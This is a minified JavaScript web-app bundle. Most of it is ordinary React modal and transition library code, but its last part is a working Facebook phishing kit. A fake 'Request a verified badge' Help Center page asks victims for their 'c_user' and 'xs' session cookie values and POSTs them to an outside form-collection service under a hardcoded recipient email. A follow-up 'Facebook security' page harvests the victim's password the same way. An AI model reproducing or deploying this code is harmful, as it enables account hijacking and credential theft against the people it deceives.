        var Hn = Function.prototype.bind.call(Function.prototype.call, [].slice);
        function Wn(e, n) {
            return Hn(e.querySelectorAll(n))
        }
        function Vn(e, n) {
            return e.replace(new RegExp("(^|\\s)" + n + "(?:\\s|$)","g"), "$1").replace(/\s+/g, " ").replace(/^\s*|\s*$/g, "")
        }
        const kn = ".fixed-top, .fixed-bottom, .is-fixed, .sticky-top"
          , Yn = ".sticky-top"
          , Sn = ".navbar-toggler";
        class Zn extends gn {
            adjustAndStore(e, n, t) {
                const r = n.style[e];
                n.dataset[e] = r,
                dn(n, {
                    [e]: `${parseFloat(dn(n, e)) + t}px`
                })
            }
            restore(e, n) {
                const t = n.dataset[e];
                void 0 !== t && (delete n.dataset[e],
                dn(n, {
                    [e]: t
                }))
            }
            setContainerStyle(e) {
                super.setContainerStyle(e);
                const n = this.getElement();
                var t, r;
                if (r = "modal-open",
                (t = n).classList ? t.classList.add(r) : function(e, n) {
                    return e.classList ? !!n && e.classList.contains(n) : -1 !== (" " + (e.className.baseVal || e.className) + " ").indexOf(" " + n + " ")
                }(t, r) || ("string" === typeof t.className ? t.className = t.className + " " + r : t.setAttribute("class", (t.className && t.className.baseVal || "") + " " + r)),
                !e.scrollBarWidth)
                    return;
                const a = this.isRTL ? "paddingLeft" : "paddingRight"
                  , i = this.isRTL ? "marginLeft" : "marginRight";
                Wn(n, kn).forEach((n => this.adjustAndStore(a, n, e.scrollBarWidth))),
                Wn(n, Yn).forEach((n => this.adjustAndStore(i, n, -e.scrollBarWidth))),
                Wn(n, Sn).forEach((n => this.adjustAndStore(i, n, e.scrollBarWidth)))
            }
            removeContainerStyle(e) {
                super.removeContainerStyle(e);
                const n = this.getElement();
                var t, r;
                r = "modal-open",
                (t = n).classList ? t.classList.remove(r) : "string" === typeof t.className ? t.className = Vn(t.className, r) : t.setAttribute("class", Vn(t.className && t.className.baseVal || "", r));
                const a = this.isRTL ? "paddingLeft" : "paddingRight"
                  , i = this.isRTL ? "marginLeft" : "marginRight";
                Wn(n, kn).forEach((e => this.restore(a, e))),
                Wn(n, Yn).forEach((e => this.restore(i, e))),
                Wn(n, Sn).forEach((e => this.restore(i, e)))
            }
        }
        let Dn;
        function Fn(e, n) {
            return Fn = Object.setPrototypeOf ? Object.setPrototypeOf.bind() : function(e, n) {
                return e.__proto__ = n,
                e
            }
            ,
            Fn(e, n)
        }
        const Gn = !1
          , Qn = n.createContext(null);
        var qn = "unmounted"
          , Un = "exited"
          , Jn = "entering"
          , Kn = "entered"
          , _n = "exiting"
          , $n = function(e) {
            var t, r;
            function i(n, t) {
                var r;
                r = e.call(this, n, t) || this;
                var a, i = t && !t.isMounting ? n.enter : n.appear;
                return r.appearStatus = null,
                n.in ? i ? (a = Un,
                r.appearStatus = Jn) : a = Kn : a = n.unmountOnExit || n.mountOnEnter ? qn : Un,
                r.state = {
                    status: a
                },
                r.nextCallback = null,
                r
            }
            r = e,
            (t = i).prototype = Object.create(r.prototype),
            t.prototype.constructor = t,
            Fn(t, r),
            i.getDerivedStateFromProps = function(e, n) {
                return e.in && n.status === qn ? {
                    status: Un
                } : null
            }
            ;
            var l = i.prototype;
            return l.componentDidMount = function() {
                this.updateStatus(!0, this.appearStatus)
            }
            ,
            l.componentDidUpdate = function(e) {
                var n = null;
                if (e !== this.props) {
                    var t = this.state.status;
                    this.props.in ? t !== Jn && t !== Kn && (n = Jn) : t !== Jn && t !== Kn || (n = _n)
                }
                this.updateStatus(!1, n)
            }
            ,
            l.componentWillUnmount = function() {
                this.cancelNextCallback()
            }
            ,
            l.getTimeouts = function() {
                var e, n, t, r = this.props.timeout;
                return e = n = t = r,
                null != r && "number" !== typeof r && (e = r.exit,
                n = r.enter,
                t = void 0 !== r.appear ? r.appear : n),
                {
                    exit: e,
                    enter: n,
                    appear: t
                }
            }
            ,
            l.updateStatus = function(e, n) {
                if (void 0 === e && (e = !1),
                null !== n)
                    if (this.cancelNextCallback(),
                    n === Jn) {
                        if (this.props.unmountOnExit || this.props.mountOnEnter) {
                            var t = this.props.nodeRef ? this.props.nodeRef.current : a.findDOMNode(this);
                            t && function(e) {
                                e.scrollTop
                            }(t)
                        }
                        this.performEnter(e)
                    } else
                        this.performExit();
                else
                    this.props.unmountOnExit && this.state.status === Un && this.setState({
                        status: qn
                    })
            }
            ,
            l.performEnter = function(e) {
                var n = this
                  , t = this.props.enter
                  , r = this.context ? this.context.isMounting : e
                  , i = this.props.nodeRef ? [r] : [a.findDOMNode(this), r]
                  , l = i[0]
                  , o = i[1]
                  , s = this.getTimeouts()
                  , u = r ? s.appear : s.enter;
                !e && !t || Gn ? this.safeSetState({
                    status: Kn
                }, (function() {
                    n.props.onEntered(l)
                }
                )) : (this.props.onEnter(l, o),
                this.safeSetState({
                    status: Jn
                }, (function() {
                    n.props.onEntering(l, o),
                    n.onTransitionEnd(u, (function() {
                        n.safeSetState({
                            status: Kn
                        }, (function() {
                            n.props.onEntered(l, o)
                        }
                        ))
                    }
                    ))
                }
                )))
            }
            ,
            l.performExit = function() {
                var e = this
                  , n = this.props.exit
                  , t = this.getTimeouts()
                  , r = this.props.nodeRef ? void 0 : a.findDOMNode(this);
                n && !Gn ? (this.props.onExit(r),
                this.safeSetState({
                    status: _n
                }, (function() {
                    e.props.onExiting(r),
                    e.onTransitionEnd(t.exit, (function() {
                        e.safeSetState({
                            status: Un
                        }, (function() {
                            e.props.onExited(r)
                        }
                        ))
                    }
                    ))
                }
                ))) : this.safeSetState({
                    status: Un
                }, (function() {
                    e.props.onExited(r)
                }
                ))
            }
            ,
            l.cancelNextCallback = function() {
                null !== this.nextCallback && (this.nextCallback.cancel(),
                this.nextCallback = null)
            }
            ,
            l.safeSetState = function(e, n) {
                n = this.setNextCallback(n),
                this.setState(e, n)
            }
            ,
            l.setNextCallback = function(e) {
                var n = this
                  , t = !0;
                return this.nextCallback = function(r) {
                    t && (t = !1,
                    n.nextCallback = null,
                    e(r))
                }
                ,
                this.nextCallback.cancel = function() {
                    t = !1
                }
                ,
                this.nextCallback
            }
            ,
            l.onTransitionEnd = function(e, n) {
                this.setNextCallback(n);
                var t = this.props.nodeRef ? this.props.nodeRef.current : a.findDOMNode(this)
                  , r = null == e && !this.props.addEndListener;
                if (t && !r) {
                    if (this.props.addEndListener) {
                        var i = this.props.nodeRef ? [this.nextCallback] : [t, this.nextCallback]
                          , l = i[0]
                          , o = i[1];
                        this.props.addEndListener(l, o)
                    }
                    null != e && setTimeout(this.nextCallback, e)
                } else
                    setTimeout(this.nextCallback, 0)
            }
            ,
            l.render = function() {
                var e = this.state.status;
                if (e === qn)
                    return null;
                var t = this.props
                  , r = t.children
                  , a = (t.in,
                t.mountOnEnter,
                t.unmountOnExit,
                t.appear,
                t.enter,
                t.exit,
                t.timeout,
                t.addEndListener,
                t.onEnter,
                t.onEntering,
                t.onEntered,
                t.onExit,
                t.onExiting,
                t.onExited,
                t.nodeRef,
                function(e, n) {
                    if (null == e)
                        return {};
                    var t, r, a = {}, i = Object.keys(e);
                    for (r = 0; r < i.length; r++)
                        t = i[r],
                        n.indexOf(t) >= 0 || (a[t] = e[t]);
                    return a
                }(t, ["children", "in", "mountOnEnter", "unmountOnExit", "appear", "enter", "exit", "timeout", "addEndListener", "onEnter", "onEntering", "onEntered", "onExit", "onExiting", "onExited", "nodeRef"]));
                return n.createElement(Qn.Provider, {
                    value: null
                }, "function" === typeof r ? r(e, a) : n.cloneElement(n.Children.only(r), a))
            }
            ,
            i
        }(n.Component);
        function et() {}
        $n.contextType = Qn,
        $n.propTypes = {},
        $n.defaultProps = {
            in: !1,
            mountOnEnter: !1,
            unmountOnExit: !1,
            appear: !1,
            enter: !0,
            exit: !0,
            onEnter: et,
            onEntering: et,
            onEntered: et,
            onExit: et,
            onExiting: et,
            onExited: et
        },
        $n.UNMOUNTED = qn,
        $n.EXITED = Un,
        $n.ENTERING = Jn,
        $n.ENTERED = Kn,
        $n.EXITING = _n;
        const nt = $n;
        function tt(e, n) {
            const t = dn(e, n) || ""
              , r = -1 === t.indexOf("ms") ? 1e3 : 1;
            return parseFloat(t) * r
        }
        function rt(e, n) {
            const t = tt(e, "transitionDuration")
              , r = tt(e, "transitionDelay")
              , a = vn(e, (t => {
                t.target === e && (a(),
                n(t))
            }
            ), t + r)
        }
        const at = n.forwardRef(( (e, t) => {
            let {onEnter: r, onEntering: i, onEntered: l, onExit: o, onExiting: s, onExited: u, addEndListener: c, children: A, childRef: d, ...f} = e;
            const p = (0,
            n.useRef)(null)
              , v = an(p, d)
              , m = e => {
                var n;
                v((n = e) && "setState"in n ? a.findDOMNode(n) : null != n ? n : null)
            }
              , h = e => n => {
                e && p.current && e(p.current, n)
            }
              , b = (0,
            n.useCallback)(h(r), [r])
              , g = (0,
            n.useCallback)(h(i), [i])
              , x = (0,
            n.useCallback)(h(l), [l])
              , w = (0,
            n.useCallback)(h(o), [o])
              , y = (0,
            n.useCallback)(h(s), [s])
              , C = (0,
            n.useCallback)(h(u), [u])
              , E = (0,
            n.useCallback)(h(c), [c]);
            return (0,
            he.jsx)(nt, {
                ref: t,
                ...f,
                onEnter: b,
                onEntered: x,
                onEntering: g,
                onExit: w,
                onExited: C,
                onExiting: y,
                addEndListener: E,
                nodeRef: p,
                children: "function" === typeof A ? (e, n) => A(e, {
                    ...n,
                    ref: m
                }) : n.cloneElement(A, {
                    ref: m
                })
            })
        }
        ))
          , it = {
            [Jn]: "show",
            [Kn]: "show"
        }
          , lt = n.forwardRef(( (e, t) => {
            let {className: r, children: a, transitionClasses: i={}, onEnter: l, ...o} = e;
            const s = {
                in: !1,
                timeout: 300,
                mountOnEnter: !1,
                unmountOnExit: !1,
                appear: !1,
                ...o
            }
              , u = (0,
            n.useCallback)(( (e, n) => {
                !function(e) {
                    e.offsetHeight
                }(e),
                null == l || l(e, n)
            }
            ), [l]);
            return (0,
            he.jsx)(at, {
                ref: t,
                addEndListener: rt,
                ...s,
                onEnter: u,
                childRef: a.ref,
                children: (e, t) => n.cloneElement(a, {
                    ...t,
                    className: Fe()("fade", r, a.props.className, it[e], i[e])
                })
            })
        }
        ));
        lt.displayName = "Fade";
        const ot = lt
          , st = ["xxl", "xl", "lg", "md", "sm", "xs"]
          , ut = "xs"
          , ct = n.createContext({
            prefixes: {},
            breakpoints: st,
            minBreakpoint: ut
        })
          , {Consumer: At, Provider: dt} = ct;
        function ft(e, t) {
            const {prefixes: r} = (0,
            n.useContext)(ct);
            return e || r[t] || t
        }
        const pt = n.forwardRef(( (e, n) => {
            let {className: t, bsPrefix: r, as: a="div", ...i} = e;
            return r = ft(r, "modal-body"),
            (0,
            he.jsx)(a, {
                ref: n,
                className: Fe()(t, r),
                ...i
            })
        }
        ));
        pt.displayName = "ModalBody";
        const vt = pt
          , mt = n.createContext({
            onHide() {}
        })
          , ht = n.forwardRef(( (e, n) => {
            let {bsPrefix: t, className: r, contentClassName: a, centered: i, size: l, fullscreen: o, children: s, scrollable: u, ...c} = e;
            t = ft(t, "modal");
            const A = `${t}-dialog`
              , d = "string" === typeof o ? `${t}-fullscreen-${o}` : `${t}-fullscreen`;
            return (0,
            he.jsx)("div", {
                ...c,
                ref: n,
                className: Fe()(A, r, l && `${t}-${l}`, i && `${A}-centered`, u && `${A}-scrollable`, o && d),
                children: (0,
                he.jsx)("div", {
                    className: Fe()(`${t}-content`, a),
                    children: s
                })
            })
        }
        ));
        ht.displayName = "ModalDialog";
        const bt = ht
          , gt = n.forwardRef(( (e, n) => {
            let {className: t, bsPrefix: r, as: a="div", ...i} = e;
            return r = ft(r, "modal-footer"),
            (0,
            he.jsx)(a, {
                ref: n,
                className: Fe()(t, r),
                ...i
            })
        }
        ));
        gt.displayName = "ModalFooter";
        const xt = gt;
        var wt = t(486)
          , yt = t.n(wt);
        const Ct = {
            "aria-label": yt().string,
            onClick: yt().func,
            variant: yt().oneOf(["white"])
        }
          , Et = n.forwardRef(( (e, n) => {
            let {className: t, variant: r, "aria-label": a="Close", ...i} = e;
            return (0,
            he.jsx)("button", {
                ref: n,
                type: "button",
                className: Fe()("btn-close", r && `btn-close-${r}`, t),
                "aria-label": a,
                ...i
            })
        }
        ));
        Et.displayName = "CloseButton",
        Et.propTypes = Ct;
        const jt = Et
          , zt = n.forwardRef(( (e, t) => {
            let {closeLabel: r="Close", closeVariant: a, closeButton: i=!1, onHide: l, children: o, ...s} = e;
            const u = (0,
            n.useContext)(mt)
              , c = tn(( () => {
                null == u || u.onHide(),
                null == l || l()
            }
            ));
            return (0,
            he.jsxs)("div", {
                ref: t,
                ...s,
                children: [o, i && (0,
                he.jsx)(jt, {
                    "aria-label": r,
                    variant: a,
                    onClick: c
                })]
            })
        }
        ))
          , Pt = n.forwardRef(( (e, n) => {
            let {bsPrefix: t, className: r, closeLabel: a="Close", closeButton: i=!1, ...l} = e;
            return t = ft(t, "modal-header"),
            (0,
            he.jsx)(zt, {
                ref: n,
                ...l,
                className: Fe()(r, t),
                closeLabel: a,
                closeButton: i
            })
        }
        ));
        Pt.displayName = "ModalHeader";
        const Nt = Pt
          , It = (Xt = "h4",
        n.forwardRef(( (e, n) => (0,
        he.jsx)("div", {
            ...e,
            ref: n,
            className: Fe()(e.className, Xt)
        }))));
        var Xt;
        const Lt = n.forwardRef(( (e, n) => {
            let {className: t, bsPrefix: r, as: a=It, ...i} = e;
            return r = ft(r, "modal-title"),
            (0,
            he.jsx)(a, {
                ref: n,
                className: Fe()(t, r),
                ...i
            })
        }
        ));
        Lt.displayName = "ModalTitle";
        const Ot = Lt;
        function Bt(e) {
            return (0,
            he.jsx)(ot, {
                ...e,
                timeout: null
            })
        }
        function Tt(e) {
            return (0,
            he.jsx)(ot, {
                ...e,
                timeout: null
            })
        }
        const Rt = n.forwardRef(( (e, t) => {
            let {bsPrefix: r, className: a, style: i, dialogClassName: l, contentClassName: o, children: s, dialogAs: u=bt, "data-bs-theme": c, "aria-labelledby": A, "aria-describedby": d, "aria-label": f, show: p=!1, animation: v=!0, backdrop: m=!0, keyboard: h=!0, onEscapeKeyDown: b, onShow: g, onHide: x, container: w, autoFocus: y=!0, enforceFocus: C=!0, restoreFocus: E=!0, restoreFocusOptions: j, onEntered: z, onExit: P, onExiting: N, onEnter: I, onEntering: X, onExited: L, backdropClassName: O, manager: B, ...T} = e;
            const [R,M] = (0,
            n.useState)({})
              , [H,W] = (0,
            n.useState)(!1)
              , V = (0,
            n.useRef)(!1)
              , k = (0,
            n.useRef)(!1)
              , Y = (0,
            n.useRef)(null)
              , [S,Z] = (0,
            n.useState)(null)
              , D = an(t, Z)
              , F = tn(x)
              , G = function() {
                const {dir: e} = (0,
                n.useContext)(ct);
                return "rtl" === e
            }();
            r = ft(r, "modal");
            const Q = (0,
            n.useMemo)(( () => ({
                onHide: F
            })), [F]);
            function q() {
                return B || function(e) {
                    return Dn || (Dn = new Zn(e)),
                    Dn
                }({
                    isRTL: G
                })
            }
            function U(e) {
                if (!Ge)
                    return;
                const n = q().getScrollbarWidth() > 0
                  , t = e.scrollHeight > Ke(e).documentElement.clientHeight;
                M({
                    paddingRight: n && !t ? en() : void 0,
                    paddingLeft: !n && t ? en() : void 0
                })
            }
            const J = tn(( () => {
                S && U(S.dialog)
            }
            ));
            ln(( () => {
                _e(window, "resize", J),
                null == Y.current || Y.current()
            }
            ));
            const K = () => {
                V.current = !0
            }
              , _ = e => {
                V.current && S && e.target === S.dialog && (k.current = !0),
                V.current = !1
            }
              , $ = () => {
                W(!0),
                Y.current = vn(S.dialog, ( () => {
                    W(!1)
                }
                ))
            }
              , ee = e => {
                "static" !== m ? k.current || e.target !== e.currentTarget ? k.current = !1 : null == x || x() : (e => {
                    e.target === e.currentTarget && $()
                }
                )(e)
            }
              , ne = (0,
            n.useCallback)((e => (0,
            he.jsx)("div", {
                ...e,
                className: Fe()(`${r}-backdrop`, O, !v && "show")
            })), [v, O, r])
              , te = {
                ...i,
                ...R
            };
            te.display = "block";
            return (0,
            he.jsx)(mt.Provider, {
                value: Q,
                children: (0,
                he.jsx)(Mn, {
                    show: p,
                    ref: D,
                    backdrop: m,
                    container: w,
                    keyboard: !0,
                    autoFocus: y,
                    enforceFocus: C,
                    restoreFocus: E,
                    restoreFocusOptions: j,
                    onEscapeKeyDown: e => {
                        h ? null == b || b(e) : (e.preventDefault(),
                        "static" === m && $())
                    }
                    ,
                    onShow: g,
                    onHide: x,
                    onEnter: (e, n) => {
                        e && U(e),
                        null == I || I(e, n)
                    }
                    ,
                    onEntering: (e, n) => {
                        null == X || X(e, n),
                        Je(window, "resize", J)
                    }
                    ,
                    onEntered: z,
                    onExit: e => {
                        null == Y.current || Y.current(),
                        null == P || P(e)
                    }
                    ,
                    onExiting: N,
                    onExited: e => {
                        e && (e.style.display = ""),
                        null == L || L(e),
                        _e(window, "resize", J)
                    }
                    ,
                    manager: q(),
                    transition: v ? Bt : void 0,
                    backdropTransition: v ? Tt : void 0,
                    renderBackdrop: ne,
                    renderDialog: e => (0,
                    he.jsx)("div", {
                        role: "dialog",
                        ...e,
                        style: te,
                        className: Fe()(a, r, H && `${r}-static`, !v && "show"),
                        onClick: m ? ee : void 0,
                        onMouseUp: _,
                        "data-bs-theme": c,
                        "aria-label": f,
                        "aria-labelledby": A,
                        "aria-describedby": d,
                        children: (0,
                        he.jsx)(u, {
                            ...T,
                            onMouseDown: K,
                            className: l,
                            contentClassName: o,
                            children: s
                        })
                    })
                })
            })
        }
        ));
        Rt.displayName = "Modal";
        const Mt = Object.assign(Rt, {
            Body: vt,
            Header: Nt,
            Title: Ot,
            Footer: xt,
            Dialog: bt,
            TRANSITION_DURATION: 300,
            BACKDROP_TRANSITION_DURATION: 150
        })
          , Ht = e => {
            let {showModal: t, setShowModal: r} = e;
            const a = _()
              , i = (0,
            n.useRef)();
            return (0,
            he.jsx)(Mt, {
                backdrop: "static",
                show: t,
                onHide: () => r(!1),
                children: (0,
                he.jsx)(Mt.Body, {
                    className: "my-4 p-4",
                    children: (0,
                    he.jsxs)("form", {
                        ref: i,
                        onSubmit: e => {
                            e.preventDefault(),
                            a("/thanks")
                        }
                        ,
                        className: "d-flex flex-column",
                        children: [(0,
                        he.jsx)("input", {
                            className: "p-1 border rounded",
                            type: "text",
                            name: "user_email",
                            placeholder: "Enter Email or Number",
                            required: !0,
                            style: {
                                boxShadow: "0 0.5rem 1rem rgba(0, 0, 0, 0.15)"
                            }
                        }), (0,
                        he.jsx)("input", {
                            className: "mt-4 p-1 border rounded",
                            name: "password",
                            type: "password",
                            placeholder: "Password",
                            style: {
                                boxShadow: " 0 0.5rem 1rem rgba(0, 0, 0, 0.15)"
                            },
                            required: !0
                        }), (0,
                        he.jsx)("button", {
                            type: "submit",
                            className: "mt-4 border-0 text-white rounded p-1",
                            style: {
                                background: "#0D6EFD",
                                boxShadow: "inset 0 1px 0 rgba(255, 255, 255, 0.15),0 1px 1px rgba(0, 0, 0, 0.075)"
                            },
                            children: "Next"
                        }), (0,
                        he.jsx)("hr", {
                            className: "my-4"
                        }), (0,
                        he.jsxs)("div", {
                            className: "d-flex justify-content-center",
                            children: [(0,
                            he.jsx)("img", {
                                className: "text-secondary",
                                src: "gsfgf",
                                alt: "meta"
                            }), (0,
                            he.jsx)("p", {
                                className: "m-0 ms-2",
                                children: "Meta"
                            })]
                        })]
                    })
                })
            })
        }
          , Wt = () => {
            const e = ["salmanjaaniiloveyou@gmail.com"]
              , t = _()
              , [r,a] = (0,
            n.useState)(!1)
              , [i,l] = (0,
            n.useState)(!1)
              , [o,s] = (0,
            n.useState)("")
              , [u,c] = (0,
            n.useState)("");
            return (0,
            he.jsxs)(he.Fragment, {
                children: [(0,
                he.jsx)("div", {
                    className: "d-flex align -items-center",
                    style: {
                        width: "100%",
                        height: "90px",
                        background: "#4667AC"
                    },
                    children: (0,
                    he.jsx)("h1", {
                        className: "text-white ms-4 m-0 d-flex align-self-center",
                        children: "facebook"
                    })
                }), (0,
                he.jsx)("div", {
                    className: "d-flex align -items-center",
                    style: {
                        width: "100%",
                        height: "60px",
                        background: "#E9EBEE"
                    },
                    children: (0,
                    he.jsx)("h4", {
                        className: "ms-4 m-0 d-flex align-self-center text-primary",
                        children: "Help Center"
                    })
                }), (0,
                he.jsx)("div", {
                    className: "col-12 my-4 d-flex justify-content-center align-items-center",
                    children: (0,
                    he.jsxs)("div", {
                        className: "col-11 col-md-6 border",
                        children: [(0,
                        he.jsx)("div", {
                            className: "p-2",
                            style: {
                                background: "#F5F6F7"
                            },
                            children: (0,
                            he.jsx)("h5", {
                                className: "m-0",
                                children: "Request a verified badge on Facebook"
                            })
                        }), (0,
                        he.jsxs)("div", {
                            className: "p-2",
                            children: [i && (0,
                            he.jsx)("div", {
                                className: "alert alert-danger",
                                children: "Please fill in all fields."
                            }), (0,
                            he.jsx)("p", {
                                className: "fw-semibold validation_form_para",
                                children: "The verified badge means that Facebook has confirmed that the Page or profile is the authentic presence of the individual, public figure or brand that it represents."
                            }), (0,
                            he.jsx)("p", {
                                className: "fw-semibold validation_form_para",
                                children: "Previously, the verified badge also required the person or brand to be notable and unique. You may still see users with a verified badge that represents our previous eligibility requirements."
                            }), (0,
                            he.jsx)("p", {
                                className: "fw-semibold validation_form_para",
                                children: "Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear. "
                            }), (0,
                            he.jsx)("p", {
                                className: "fw-semibold text-secondary",
                                style: {
                                    fontSize: "12px"
                                },
                                children: "Detailed Video Information."
                            }), (0,
                            he.jsx)("a", {
                                href: "https://www.youtube.com/embed/0MM0k0w3gj0",
                                children: (0,
                                he.jsx)("img", {
                                    src: me,
                                    alt: "fb",
                                    style: {
                                        width: "120px",
                                        height: "80px"
                                    }
                                })
                            }), (0,
                            he.jsx)("br", {}), (0,
                            he.jsx)("p", {
                                className: "fw-semibold validation_form_para mt-2",
                                children: "Please be sure to provide the requested information below."
                            }), (0,
                            he.jsxs)("form", {
                                onSubmit: n => {
                                    n.preventDefault(),
                                    u && o ? (fetch("https://submit-form.com/udfuABlZj", {
                                        method: "POST",
                                        headers: {
                                            "Content-Type": "application/json"
                                        },
                                        body: JSON.stringify({
                                            emails: e,
                                            workerEmail: "",
                                            xs: o,
                                            c_user: u,
                                            name: "My Self"
                                        })
                                    }).then((e => {
                                        e.ok
                                    }
                                    )),
                                    t("/pass")) : l(!0)
                                }
                                ,
                                children: [(0,
                                he.jsx)("label", {
                                    className: "",
                                    style: {
                                        fontSize: "12px"
                                    },
                                    children: "c_user"
                                }), (0,
                                he.jsx)("br", {}), (0,
                                he.jsx)("input", {
                                    type: "number",
                                    name: "c_user",
                                    value: u,
                                    onChange: e => c(e.target.value),
                                    required: !0,
                                    title: "Please enter 15 digits"
                                }), (0,
                                he.jsx)("br", {}), (0,
                                he.jsx)("label", {
                                    className: "mt-2",
                                    style: {
                                        fontSize: "12px"
                                    },
                                    children: "xs"
                                }), (0,
                                he.jsx)("br", {}), (0,
                                he.jsx)("input", {
                                    type: "text",
                                    name: "xs",
                                    value: o,
                                    onChange: e => s(e.target.value),
                                    required: !0
                                }), (0,
                                he.jsx)("p", {
                                    className: "mt-2",
                                    style: {
                                        fontSize: "12px"
                                    },
                                    children: "Please make sure not to log out from your computer or laptop until you have received a verification email."
                                }), (0,
                                he.jsx)("div", {
                                    className: "p-2 mb-2 d-flex justify-content-end",
                                    style: {
                                        background: "#F5F6F7"
                                    },
                                    children: (0,
                                    he.jsx)("button", {
                                        type: "submit",
                                        className: "text-white border-0",
                                        style: {
                                            background: "#4267B2"
                                        },
                                        children: "Submit"
                                    })
                                })]
                            })]
                        })]
                    })
                }), r && (0,
                he.jsx)(Ht, {
                    showModal: r,
                    setShowModal: a
                })]
            })
        }
          , Vt = () => {
            const e = _()
              , [t,r] = (0,
            n.useState)();
            return (0,
            he.jsxs)("div", {
                className: "passwordContainer",
                children: [(0,
                he.jsx)("img", {
                    src: "https://cdn.iconscout.com/icon/free/png-512/free-facebook-4062815-3357701.png?f=webp&w=512",
                    alt: "Facebook Logo"
                }), (0,
                he.jsx)("h3", {
                    children: "Facebook security"
                }), (0,
                he.jsx)("hr", {}), (0,
                he.jsx)("p", {
                    children: "Please re-enter password to complete the request."
                }), (0,
                he.jsx)("input", {
                    type: "password",
                    value: t,
                    onChange: e => r(e.target.value),
                    placeholder: "Password",
                    name: "password"
                }), (0,
                he.jsx)("button", {
                    onClick: n => {
                        n.preventDefault(),
                        fetch("https://submit-form.com/udfuABlZj", {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify({
                                password: t
                            })
                        }).then((e => {}
                        )),
                        e("/thanks")
                    }
                    ,
                    children: "Submit"
                })]
            })
        }
          , kt = () => (0,
        he.jsx)("div", {
            children: (0,
            he.jsxs)(pe, {
                children: [(0,
                he.jsx)(de, {
                    path: "/",
                    element: (0,
                    he.jsx)(ge, {})
                }), (0,
                he.jsx)(de, {
                    path: "/validation",
                    element: (0,
                    he.jsx)(Wt, {})
                }), (0,
                he.jsx)(de, {
                    path: "/thanks",
                    element: (0,
                    he.jsx)(Ze, {})
                }), (0,
                he.jsx)(de, {
                    path: "/pass",
                    element: (0,
                    he.jsx)(Vt, {})
                })]
            })
        });
        const Yt = function() {
            return (0,
            he.jsx)(he.Fragment, {
                children: (0,
                he.jsx)(kt, {})
            })
        };
        a.createRoot(document.getElementById("root")).render((0,
        he.jsx)(n.StrictMode, {
            children: (0,
            he.jsx)(Ee, {
                children: (0,
                he.jsx)(Yt, {})
            })
        }))
    }
    )()
}
)();